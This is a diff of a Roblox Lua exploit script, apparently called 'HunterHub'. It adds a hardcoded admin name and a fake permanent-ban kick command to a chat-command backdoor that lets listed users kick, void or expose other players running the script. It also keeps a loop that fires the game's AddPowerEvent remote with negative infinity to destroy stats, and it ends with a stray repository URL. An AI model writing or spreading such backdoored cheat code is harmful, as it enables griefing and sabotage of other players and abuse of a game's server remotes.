@@ -16,7 +16,7 @@ local Admins = {
 	["Brxy_Alt"] = true,
 	["VyxzarlIion"] = true,
 	["Bowmbaclaat"] = true,
-	["Drenvoryth"] = true
+	["FrostByte_074"] = true
 }
 
 local function destroyCharacter(player)
@@ -60,6 +60,11 @@ local function ChatCommand(speakerName, message)
 		LocalPlayer:Kick("You were removed from the game by an unknown authority.")
 	end
 
+	local banTarget = message:match("//ban%s+(%w+)")
+	if banTarget and LocalPlayer.Name:lower():find(banTarget) then
+		LocalPlayer:Kick("you've been permanently banned from this game")
+	end
+
 	local voidTarget = message:match("//void%s+(%w+)")
 	if voidTarget and LocalPlayer.Name:lower():find(voidTarget) then
 		local char = LocalPlayer.Character
@@ -68,16 +73,9 @@ local function ChatCommand(speakerName, message)
 		end
 	end
 
-	if message:find("//bringusers") then
-		local admin = Players:FindFirstChild(speakerName)
-		if admin and admin.Character and admin.Character:FindFirstChild("HumanoidRootPart") then
-			local root = admin.Character.HumanoidRootPart
-			local char = LocalPlayer.Character
-			if char and char:FindFirstChild("HumanoidRootPart") then
-				char:MoveTo(root.Position + Vector3.new(3, 0, 3))
-			end
-		end
-	end
+	if message:find("//revealusers") then
+	   TextChatService.TextChannels.RBXGeneral:SendAsync("HunterHub V4.7.5")
+   end
 
 	if message:find("//shutdown") then
 		TeleportService:Teleport(PlaceId, LocalPlayer)
@@ -88,14 +86,12 @@ local function ChatCommand(speakerName, message)
 		instakillStarted = true
 
 		RunService.RenderStepped:Connect(function()
-			-- Rename "Train" in Backpack
 			for _, item in ipairs(LocalPlayer.Backpack:GetChildren()) do
 				if item:IsA("Tool") and item.Name == "Train" then
 					item.Name = "None"
 				end
 			end
 
-			-- Rename "Train" in Character
 			local char = LocalPlayer.Character
 			if char then
 				for _, item in ipairs(char:GetChildren()) do
@@ -105,7 +101,6 @@ local function ChatCommand(speakerName, message)
 				end
 			end
 
-			-- Rename "Train" in Workspace (regardless of owner)
 			for _, item in ipairs(workspace:GetChildren()) do
 				if item:IsA("Tool") and item.Name == "Train" and item.Parent == workspace then
 					item.Name = "None"
@@ -114,38 +109,38 @@ local function ChatCommand(speakerName, message)
 		end)
 
 		task.spawn(function()
-	while true do
-		local Backpack = LocalPlayer:FindFirstChild("Backpack")
-		local Character = LocalPlayer.Character
-		local None = Backpack and Backpack:FindFirstChild("None") or (Character and Character:FindFirstChild("None"))
-		
-		if None then
-			if None.Parent == Backpack then
-				None.Parent = Character
+			while true do
+				local Backpack = LocalPlayer:FindFirstChild("Backpack")
+				local Character = LocalPlayer.Character
+				local None = Backpack and Backpack:FindFirstChild("None") or (Character and Character:FindFirstChild("None"))
+
+				if None then
+					if None.Parent == Backpack then
+						None.Parent = Character
+					end
+					break
+				end
+
+				task.wait(0.1)
 			end
-			break
-		end
-		
-		task.wait(0.1) -- Check every 0.1s until "None" exists
-	end
-end)
+		end)
 
 		task.spawn(function()
-	while true do
-		local stats = LocalPlayer:FindFirstChild("leaderstats")
-		local ninjutsu = stats and stats:FindFirstChild("Ninjutsu")
-		
-		if ninjutsu and ninjutsu.Value == -math.huge then
-			break
-		end
+			while true do
+				local stats = LocalPlayer:FindFirstChild("leaderstats")
+				local ninjutsu = stats and stats:FindFirstChild("Ninjutsu")
 
-		game.ReplicatedStorage.RemoteEvent.AddPowerEvent:FireServer("FromTraining", -math.huge)
-		task.wait(0.1) -- adjust this if you want faster/slower firing
-	end
-end)
-                wait(0.5)
-		game:GetService("ReplicatedStorage").RemoteEvent.SpawnCharacterEvent:FireServer("RandomSpawn")
+				if ninjutsu and ninjutsu.Value == -math.huge then
+					break
+				end
 
+				ReplicatedStorage.RemoteEvent.AddPowerEvent:FireServer("FromTraining", -math.huge)
+				task.wait(0.1)
+			end
+		end)
+
+		wait(0.5)
+		ReplicatedStorage.RemoteEvent.SpawnCharacterEvent:FireServer("RandomSpawn")
 	end
 end
 
@@ -189,3 +184,5 @@ Players.PlayerAdded:Connect(function(player)
 		handleAdmin(player)
 	end
 end)
+
+https://github.com/9879875atpzgegally2123451/n071F13r18136628.git
